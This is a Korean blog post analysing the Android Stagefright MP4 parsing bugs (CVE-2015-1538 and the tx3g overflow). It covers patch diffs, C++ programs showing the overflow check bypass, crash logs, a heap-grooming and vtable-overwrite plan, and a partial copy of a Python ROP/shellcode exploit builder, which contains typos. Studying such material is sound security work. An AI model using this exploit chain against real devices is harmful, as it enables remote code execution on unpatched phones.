---
layout: post
title: "Stagefright"
date: 2015-09-13 20:55:51 +0900
comments: true
categories: 
---

Android 의 Stagefright 버그를 정리해본다.

* [CryptoGirl on StageFright: A Detailed Explanation](http://blog.fortinet.com/post/cryptogirl-on-stagefright-a-detailed-explanation)
* [Stagefright Vulnerability Disclosure](http://translate.wooyun.io/2015/08/08/Stagefright-Vulnerability-Disclosure.html)
* [Stagefrightened?](http://googleprojectzero.blogspot.gr/2015/09/stagefrightened.html)
* [Zimperium Blog](https://blog.zimperium.com/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/)

#### What's an ATOM?

MPEG-4 는 atoms 나 boxes 같은 유닛으로 이뤄져있다. 이 box 들은 header 로 시작하는데, 헤더는 다음과 같다.
BoxType 은 4 글자 코드로 구성된다. FourCC 라고 불리는데, `covr`, `esds` 같은 식이다.

```
BOXHEADER structure
Field           Type                    Comment
TotalSize       UI32                    The total size of the box in bytes, including this header
BoxType         UI32                    The type of atom
ExtendedSize    If TotalSize equals 1   The total 64-bit length of the box in bytes,
                UI64                    including this header
```

MP4 를 분석할 때 유용한 도구들.

* 010 Editor 
* mp4file (apt-get install mp4v2-utils)
* [mp4 parser](https://sites.google.com/site/james2013notes/download)

StageFright 버그에 영향받는 Box 종류들은 다음과 같다.

* `albm` : album title and track number for the media
* `auth` : author of the media
* `covr` : album cover artwork
* `ctss` : composition Time To Sample mapping
* `esds` : elementary Stream Description
* `gnre` : genre of the media
* `perf` : performer or artist
* `stsc` : sample to chunk mapping
* `stss` : list of sync samples
* `tx3g` : text metadata
* `yrrc` : recording year for the media

여러가지 버그들이 있는데, 일단 대충 감을 잡기 위해 가장 간단한 `stts` integer overflow 를 보련다.

#### stts integer overflow 

일단 패치만 보면,

```
-   uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);
+   uint64_t allocSize = numEntries * 2 * (uint64_t)sizeof(uint32_t);
```

* 주변의 소스를 봐야겠지만, 
* `(uint64_t)` 로 캐스팅을 안해줘서, 32 bit 로 연산이 되어서, overflow 가 나버리는 것 같다. 
* `allocSize = numEntries * 2 * 4 >= 0xFFFFFFFF + 1` 이면 overflow 가 나서, 
* 작은 숫자가 되버리고, 그게 64 bit 로 확장되는 듯.
* 작은 숫자로 memory alloc 이 되어서, 버퍼는 작은데, overrun 이 일어나는 듯.

`stts` box 는 `defines time-to-sample mapping for a sample table` 한다고 하는데.

```
stts box
Field       Type                Comment
Header      BOXHEADER           BoxType = 'stts' (0x73747473)
Version     UI8                 Expected to be 0
Flags       UI24                None defined, set to 0
Count       UI32                The number of STTSRECORD entries
Entries     STTSRECORD[Count]   An array of STTSRECORD structures
```

여기서 numEntries 가 `Count` 에 해당한다고. `stts` 다음의 5,6,7,8 번째 바이트가 `20 00 00 00` 보다 크다면, integer overflow 가 난다고.

Crash 를 보면,

```
F/libc: Fatal signal 11 (SIGSEGV) at 0x10958a14 (code=1), thread 1490 (Binder_2)...
...
```

#### Google Project Zero

구글 Project Zero 팀이 글을 하나 올렸는데. `tx3g` 청크 타입 파싱 루틴에서 발생하는 integer overflow 버그이다.

`chunk_size` 는 `uint64_t` 타입이며, 화일에서 읽어들인다. 공격자가 컨트롤하는 변수. 검증은 부족.

* `size + chunk_size` 에서 overflow 가 발생하면서, 버퍼가 작게 alloc 되고
* 바로 따라오는 memcpy 가 `size` 만큼 카피하면서 buffer overrun 이 발생하는 모양.

```
case FOURCC('t', 'x', '3', 'g'):
{
    uint32_t type;
    const void *data;
    size_t size = 0;
    if (!mLastTrack->meta->findData(kKeyTextFormatData, &type, &data, &size)) {
        size = 0;
    }
    uint8_t *buffer = new uint8_t[size + chunk_size];   // <---- Integer overflow here
    if (size > 0) {
        memcpy(buffer, data, size);                     // <---- Oh dear.
    }
    if ((size_t)(mDataSource->readAt(*offset, buffer + size, chunk_size)) < chunk_size) {
        delete[] buffer;
        buffer = NULL;
        return ERROR_IO;
    }
    mLastTrack->meta->setData(kKeyTextFormatData, 0, buffer, size + chunk_size);
    delete[] buffer;
    *offset += chunk_size;
    break;
}
```

간단한 sample code 를 만들어보았다.

```
#include <cstddef>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>

void* operator new(size_t size)
{
    std::cout << "allocating " << size << std::endl;
    return malloc(size);
}

int main()
{
    size_t size = 100;
    uint64_t chunk_size=0xffffffffffffffff;
    
    uint8_t *buffer = new uint8_t[size + chunk_size];
}
```

이걸 컴파일해서 돌리면,

```
$ g++ babo.cpp
$ ./a.out
allocating 99
$
```

* new allocator 에서 `size + chunk_size` 를 계산할때, chunk_size 를 -1 로 계산하는 모양.
* 메모리 alloc 되는 buf size 가 100 에서 99 로 줄어들었다. 
* 이런식으로 줄어든 버퍼에, `memcpy(...,...,100)` 이 들어가면 버퍼 오버런이 발생하게 된다.

그래서, fix 가 들어갔는데, Mark Brand 에 따르면 완전하지 않다고.

첫번째, Fix 는 다음과 같았는데.

```
if (SIZE_MAX - chunk_size <= size) {    // <---- attempt to prevent overflow
    return ERROR_MALFORMED;
}
```

문제는 chunk_size 는 `uint64_t` 인데, SIZE_MAX 는 `0xffffffff` 이라는 것. chunk_size > SIZE_MAX 일수가 있고, 그러면 if () check 를 통과하게 된다. Box 헤더의 extended chunk 를 쓰면 큰 chunk_size 를 만들 수 있다고 한다.

아까 사용했던 코드에 overflow check 를 넣어서 테스트해본다.

```
#include <cstddef>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>

void* operator new(size_t size)
{
    std::cout << "allocating " << size << std::endl;
    return malloc(size);
}

int main()
{
    size_t size = 100;
    uint64_t chunk_size=0xffffffffffffffff;

#define MAX_SIZE (4294967295U)

    if (MAX_SIZE - chunk_size <= size) {
        std::cout << "integer overflow detected!" << std::endl;
    } else {
        std::cout << "seems good." << std::endl;
    }
    uint8_t *buffer = new uint8_t[size + chunk_size];
}
$ g++ babo.cpp
$ ./a.out
seems good.
allocating 99
```

체크를 바이패스하였다.

[Issue 502: libstagefright integer overflow checks can by bypassed with extended chunk length](https://code.google.com/p/google-security-research/issues/detail?id=502)

Mark Brand 의 PoC subtitletest.mp4 를 HTC E8 에 넣고 돌리면 다음과 같이 mediaserver 가 죽는다.

```
I/DEBUG   (  442): pid: 11709, tid: 11726, name: Binder_2  >>> /system/bin/mediaserver <<<
I/DEBUG   (  442): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xdeadbaad
I/DEBUG   (  442): Abort message: 'invalid address or address of corrupt block 0xb760d3c0 passed to dlfree'
I/DEBUG   (  442):     r0 00000000  r1 b6f52dec  r2 00000001  r3 00000000
I/DEBUG   (  442):     r4 b760d3c0  r5 deadbaad  r6 00000048  r7 00000000
I/DEBUG   (  442):     r8 b760d3c8  r9 b47c5e98  sl b760d3c8  fp 00000000
I/DEBUG   (  442):     ip 00000000  sp b47c5e30  lr b6f23f5b  pc b6f23f5a  cpsr 60030030
I/DEBUG   (  442):
I/DEBUG   (  442): backtrace:
I/DEBUG   (  442):     #00 pc 00028f5a  /system/lib/libc.so (dlfree+1241)
I/DEBUG   (  442):     #01 pc 0000f1df  /system/lib/libc.so (free+10)
I/DEBUG   (  442):     #02 pc 000988c9  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1552)
I/DEBUG   (  442):     #03 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
I/DEBUG   (  442):     #04 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
I/DEBUG   (  442):     #05 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
I/DEBUG   (  442):     #06 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
I/DEBUG   (  442):     #07 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
I/DEBUG   (  442):     #08 pc 0009a29b  /system/lib/libstagefright.so (android::MPEG4Extractor::readMetaData()+66)
I/DEBUG   (  442):     #09 pc 0009a75b  /system/lib/libstagefright.so (android::MPEG4Extractor::countTracks()+4)
I/DEBUG   (  442):     #10 pc 0007df75  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource_l(android::sp<android::MediaExtractor> const&)+148)
I/DEBUG   (  442):     #11 pc 0007e915  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource_l(android::sp<android::DataSource> const&)+668)
I/DEBUG   (  442):     #12 pc 00080271  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource(int, long long, long long)+324)
I/DEBUG   (  442):     #13 pc 000450f9  /system/lib/libmediaplayerservice.so (android::MediaPlayerService::Client::setDataSource(int, long long, long long)+544)
I/DEBUG   (  442):     #14 pc 0005ca55  /system/lib/libmedia.so (android::BnMediaPlayer::onTransact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)+660)
I/DEBUG   (  442):     #15 pc 00017fc5  /system/lib/libbinder.so (android::BBinder::transact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)+60)
I/DEBUG   (  442):     #16 pc 0001d1d9  /system/lib/libbinder.so (android::IPCThreadState::executeCommand(int)+628)
I/DEBUG   (  442):     #17 pc 0001d347  /system/lib/libbinder.so (android::IPCThreadState::getAndExecuteCommand()+38)
I/DEBUG   (  442):     #18 pc 0001d39d  /system/lib/libbinder.so (android::IPCThreadState::joinThreadPool(bool)+68)
I/DEBUG   (  442):     #19 pc 00021a33  /system/lib/libbinder.so
I/DEBUG   (  442):     #20 pc 00011671  /system/lib/libutils.so (android::Thread::_threadLoop(void*)+112)
I/DEBUG   (  442):     #21 pc 00011131  /system/lib/libutils.so
I/DEBUG   (  442):     #22 pc 00012f8b  /system/lib/libc.so (__pthread_start(void*)+30)
I/DEBUG   (  442):     #23 pc 0001104f  /system/lib/libc.so (__start_thread+6)
```

이제 PoC 분석에 들어가본다.

아래 그림은 구글 블로그에서 가져온 것인데. text 를 두개 alloc 하는데, 하나는 정상, 그리고 또 하나는 extended chunk size 로 0xffffffffffffffff 을 세팅하는 mp3 데이터이다.

{% img /images/tx3g.png %}

저자는 MPEGExtractor.cpp 쪽에 로그를 집어넣고 빌드를 다시해서, PoC MP4 를 로드해본 결과 다음과 같은 로그가 잡혔다고 한다.

```
 MPEG4Extractor: Identified supported mpeg4 through LegacySniffMPEG4.
 MPEG4Extractor: trak: new Track[20] (0xb6048160)
 MPEG4Extractor: trak: mLastTrack = 0xb6048160
 MPEG4Extractor: tx3g: size 0 chunk_size 24
 MPEG4Extractor: tx3g: new[24] (0xb6048130)
 MPEG4Extractor: tx3g: mDataSource->readAt(*offset, 0xb6048130, 24)
 MPEG4Extractor: tx3g: size 24 chunk_size 18446744073709551615
 MPEG4Extractor: tx3g: new[23] (0xb6048130)
 MPEG4Extractor: tx3g: memcpy(0xb6048130, 0xb6048148, 24)
 MPEG4Extractor: tx3g: mDataSource->readAt(*offset, 0xb6048148, 18446744073709551615)
```

* `new[23] (0xb6048130)` 으로 24 - 1 이 잡혀버린 것.
* `memcpy(0xb6048130, 0xb6048148, 24)` 로 24 가 들어간 것.
* `mDataSource->readAt(*offset, 0xb6048148, 18446744073709551615)` 로 read 사이즈는 184467...1615 가 들어간 것.

나도 CyanogenMod 를 빌드해서 올려놓고 테스트하는게 나을 것 같다는 생각이 든다.

어쨌든, 이제 exploit 을 만들기 위해서 몇가지 primitive 들이 필요하다고 한다. 그 첫번째는 memory alloc primitive 라고 하는데. Memory corruption 에서 memory alloc primitive 가 필요한 이유는 대부분의 경우, fragmented 된 영역을 채워버려서 메모리 상태를 좀 더 관리된 상태로 만들고 싶을 때이다. 

저자는 `pssh` box 를 이용하면 필요할 때 memory alloc 을 할 수 있다고 한다. `new` 로 들어가는 memory alloc 되는 버퍼의 length, 내용을 control 할 수 있다.

``` 
case FOURCC('p','s','s','h'):
{
    *offset += chunk_size;
    PsshInfo pssh;
    if (mDataSource->readAt(data_offset + 4, &pssh.uuid, 16) < 16) {
        return ERROR_IO;
    }
    uint32_t psshdatalen = 0;
    if (mDataSource->readAt(data_offset + 20, &psshdatalen, 4) < 4) {
        return ERROR_IO;
    }
    // pssh.datalen is set to a size we control
    pssh.datalen = ntohl(psshdatalen);
    ALOGV("pssh data size: %d", pssh.datalen);
    if (pssh.datalen + 20 > chunk_size) {
        // pssh data length exceeds size of containing box
        return ERROR_MALFORMED;
    }
    // pssh.data is an allocated block of memory of a size we control
    pssh.data = new (std::nothrow) uint8_t[pssh.datalen];
    if (pssh.data == NULL) {
        return ERROR_MALFORMED;
    }
    ALOGV("allocated pssh @ %p", pssh.data);
    ssize_t requested = (ssize_t) pssh.datalen;
    // now we read data we control into that allocation
    if (mDataSource->readAt(data_offset + 24, pssh.data, requested) < requested) {
        return ERROR_IO;
    }
    // and store it, so the allocation lives for the lifetime of our MPEG4Extractor
    // (these pssh blocks are in fact released in the destructor for the MPEG4Extractor)
    mPssh.push_back(pssh);
    break;
}
```

* `pssh.data = new (std::nothrow) uint8_t[pssh.datalen];` 로 memory alloc 을.
* `mDataSource->readAt()` 으로 alloc 한 memory 에 read 를 한다.
* memory size 나 메모리에 들어가는 data 는 해커가 control 할 수 있다.

이제 두번째 primitive 가 필요하다고 하는데,

두번째 primitive 는 `avcC` 를 이용한 것인데, 이 box 를 처음만나게 되면, 파서는 메모리를 alloc 하고 내용을 저장 -> 두번째 만나면 replace & release 한다고.

```
case FOURCC('a', 'v', 'c', 'C'):
{
    *offset += chunk_size;
    sp<ABuffer> buffer = new ABuffer(chunk_data_size);
    if (mDataSource->readAt(data_offset, buffer->data(), chunk_data_size) < chunk_data_size) {
        return ERROR_IO;
    }
    // this internally copies buffer->data() into a buffer of a size chunk_data_size, and
    // releases the previously stored data.
    mLastTrack->meta->setData(hKeyAVCC, kTypeAVCC, buffer->data(), chunk_data_size);
    break;
}
```

* `this internally copies buffer->data() into a buffer of a size chunk_data_size, and releases the previously stored data.`

이건 setData() 를 좀 봐야할 듯.

어쨌든, 블로그에 따르면 excution control 을 가져오는 전술은, overflow 가 일어나서 MPEG4DataSource C++ object 를 overwrite 하는 시나리오를 만드는 것. MPEG4DataSource 를 alloc 하는 박스는 `stbl` 박스.

사용하는 primitvie 들을 정리하면,

* Integer overflow 가 있는 박스는 `tx3g`
* Memory alloc 을 하는 것은 `pssh`
* Corrupt 될 object 를 alloc 하는 것은 `stbl`
* Memory alloc & release 를 하는 것은 `avcC` & `hvcC`

시나리오는 다음과 같다고 한다.

* chunk_size 를 크게 만들어서 lhs 를 minus 로 만들어서 check 를 뚫는다.
* chunk_size 가 minus 로 인식되어서 size 는 32 보다 큰데, chunk_size 를 더하면 32 로 감소되고.
* buffer 를 mDataSource 오브젝트 바로 전에 alloc 되게 한다.
* buffer 는 32 바이트 alloc 되는데, read 는 32 바이트 이상된다.
* `memcpy()` 에서 buffer 뒤에 위치한 MPEG4Source 오브젝트의 vtable 이 오염된다.
* `mDataSource->readAt()` 으로 control flow 가 튀게 된다.

```
case FOURCC('t', 'x', '3', 'g'):
{
    uint32_t type;
    const void *data;
    size_t size = 0;
    if (!mLastTrack->meta->findData(kKeyTextFormatData, &type, &data, &size)) {
        size = 0;
    }

    // chunk_size 를 크게 만들어서 lhs 를 minus 를 만들어서 check 를 뚫는다.
    if (SIZE_MAX - chunk_size <= size) {
        return ERROR_MALFORMED;
    }

    // chunk_size 가 minus 로 인식되어서 size 는 32 보다 큰데, chunk_size 를 더하면 32 로 감소.
    // overflow here, so that size + chunk_size == 32 and size > 32
    uint*_t *buffer = new uint8_t[size + chunk_size];

    // buffer 를 mDataSource 오브젝트 바로 전에 alloc 되게 한다.
    // buffer is allocated immediately before mDataSource
    if (size > 0) {
        // 여기서 MPEG4DataSource 오브젝트의 vtable 을 커럽트 시킨다고 한다.
        // this will overflow and corrupt the mDataSource vtable
        memcpy(buffer, data, size);
    }

    // vtable 를 참조하게 되어서 control flow 가 튀게된다고 한다.
    // this call goes through the corrupt vtable, and we get control of execution
    if ((size_t)(mDataSource->readAt(*offset, buffer + size, chunk_size)) < chunk_size) {
}
```

그러면 이 시나리오를 만들기 위해서 어떻게 box 들을 배치해야 할까?

* 16 bytes 의 `avcC`
* 16 bytes 의 `hvcC`


#### Mark Brand's Exploit

돌아다니는 exploit 에는 2 가지가 있는데, Zimperium 코드랑 Mark Brand 가 쓴 파이썬 코드.

```
#!/usr/bin/python2

import cherrypy
import os
import pwnlib.asm as asm
import pwnlib.elf as elf
import sys
import struct

with open('shellcode.bin', 'rb') as tmp:
    shellcode = tmp.read()

while len(shellcode) % 4 != 0:
    shellcode += '\x00'

# heap grooming configuration
alloc_size = 0x20
groom_count = 0x4
spray_size = 0x10000
spray_count = 0x10

# address of the buffer we allocate for our shellcode
mmap_address = 0x90000000

# addresses that we need to predict
libc_base = 0xb6ebd000
spray_address = 0xb3000000

# ROP gadget addresses
stack_pivot = None
pop_pc = None
pop_r0_r1_r2_r3_pc = None
pop_r4_r5_r6_r7_pc = None
ldr_lr_bx_lr = None
ldr_lr_bx_lr_stack_pad = 0
mmap64 = None
memcpy = None

def find_arm_gadget(e, gadget):
    gadget_bytes = asm.asm(gadget, arch='arm')
    gadget_address = None
    for address in e.search(gadget_bytes):
        if address % 4 == 0:
            gadget_address = address
            if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
                print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
                break
    return gadget_address

def find_thumb_gadget(e, gadget):
    gadget_bytes = asm.asm(gadget, arch='thumb')
    gadget_address = None
    for address in e.search(gadget_bytes):
        if address % 2 == 0:
            gadget_address = address + 1
            if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
                print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
                break
    return gadget_address

def find_gadget(e, gadget):
    gadget_address = find_thumb_gadget_e, gadget)
    if gadget_address is not None:
        return gadget_address
    return find_arm_gadget(e, gadget)

def find_rop_gadgets(path):
    global memcpy
    global mmap64
    global stack_pivot
    global pop_pc
    global pop_r0_r1_r2_r3_pc
    global pop_r4_r5_r6_r7_pc
    global ldr_lr_bx_lr
    global ldr_ldr_bx_lr_stack_pad

    e = elf.ELF(path)
    e.address = libc_base

    memcpy = e.symbols['memcpy']
    print '[*] memcpy : 0x{:08x}'.format(memcpy)
    mmap64 = e.symbols['mmap64']
    print '[*] mmap64 : 0x{:08x}'.format(mmap64)

    # ADD       R2, R0, #0x4C
    # LDMIA     R2, {R4-LR}
    # TEQ       SP, #0
    # TEQNE     LR, #0
    # BEQ       botch_0
    # MOV       R0, R1
    # TEQ       R0, #0
    # MOVEQ     R0, #1
    # BX        LR

    pivot_asm = ''
    pivot_asm += 'add   r2, r0, #0x4c\n'
    pivot_asm += 'ldmia r2, {r4 - lr}\n'
    pivot_asm += 'teq   sp, #0\n'
    pivot_asm += 'teqne lr, #0'
    stack_pivot = find_arm_gadget(e, pivot_asm)
    print '[*] stack_pivot : 0x{:08x}.format(stack_pivot)

    pop_pc_asm = 'pop {pc}'
    pop_pc = find_gadget(e, pop_pc_asm)
    print '[*] pop_pc : 0x{:08x}'.format(pop_pc)

    pop_r0_r1_r2_r3_pc = find_gadget(e, 'pop {r0, r1, r2, r3, pc}')
    print '[*] pop_r0_r1_r2_r3_pc : 0x{:08x}'.format(pop_r0_r1_r2_r3_pc)

    pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
    print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)

    ldr_lr_bx_lr_stack_pad = 0
    for i in range(0, 0x100, 4):
        ldr_lr_bx_lr_asm = 'ldr lr, [sp, #0x{:08x}]\n'.format(i)
        ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
        ldr_lr_bx_lr_asm += 'bx lr'
        ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
        if ldr_lr_bx_lr is not None:
            ldr_lr_bx_lr_stack_pad = i
            break

    def pad(size):
        return '#' * size
```

#### Zimperium Exploit

Joshua Drake 가 [exploit](https://raw.githubusercontent.com/jduck/cve-2015-1538-1/master/Stagefright_CVE-2015-1538-1_Exploit.py) 을 공개했다. 분석해본다.

